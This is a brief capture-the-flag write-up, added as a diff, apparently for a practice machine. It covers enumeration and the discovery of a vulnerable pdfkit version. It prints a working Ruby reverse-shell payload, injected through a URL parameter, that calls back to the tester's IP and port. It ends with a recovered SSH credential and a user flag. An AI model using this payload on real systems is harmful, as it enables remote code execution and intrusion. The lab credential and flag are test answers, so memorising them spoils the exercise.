@@ -1,0 +1,22 @@
+Phusion Passenger(R) 6.0.15
+
+gobuster came up blank -> no extra directories found
+subdomain enum also came up blank
+
+Using tcpdump we could retrieve the packets from a session where the site would take in the url value of our IP-Address to a Python3 http:server session.
+
+Upon reading the output file; the packets say that the website is using a
+pdfkit v0.8.6 when generating PDF files.
+
+pdfkit v0.8.6 has a known CVE directed here : https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
+
+The CVE allows for RCE with Ruby Code
+
+http://10.10.14.109/?name=#{'%20`ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.14.109","4444");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'`'}
+
+Moving through the system as Ruby, in our home folder we have a file we can cat
+giving us an ssh credential for a user
+
+henry:Q3c1AqGHtoI0aXAYFH
+
+user-flag:7272ffdd109c820e51362131254cad77
